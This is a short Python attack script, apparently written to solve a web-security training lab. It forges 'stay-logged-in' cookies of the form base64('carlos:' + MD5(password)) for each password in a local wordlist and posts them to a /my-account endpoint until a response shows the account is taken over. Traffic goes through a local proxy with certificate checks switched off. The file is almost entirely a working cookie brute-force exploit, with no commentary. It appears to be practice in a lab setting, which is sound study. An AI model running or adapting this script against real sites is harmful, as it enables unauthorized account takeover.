import requests
import sys
import urllib3
import base64
import hashlib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8087', 'https': 'http://127.0.0.1:8087'}

def auth_exploit(url, passList) :
    for password in passList :
        password_hash = hashlib.md5(password.encode()).hexdigest()
        password_hash = "carlos:" + password_hash
        cookies = {"stay-logged-in": base64.b64encode(password_hash.encode()).decode()}
        r = requests.post(url+"/my-account?id=carlos", cookies=cookies, proxies=proxies, verify=False)
        
        if "Log out" in r.text :
            print("\n(+) User carlos logged in with password: " + password)
            break
        else :
            sys.stdout.write("\r" + password)
            sys.stdout.flush()

if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
    except IndexError:
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    with open(r'C:\Users\zeiny\OneDrive\Documents\Etudes\PROJETS\scripts\web_acad\authentification\wordlist\password.txt', "r") as file :
        passList = file.read().splitlines()
        file.close()
    
    auth_exploit(url, passList) 
    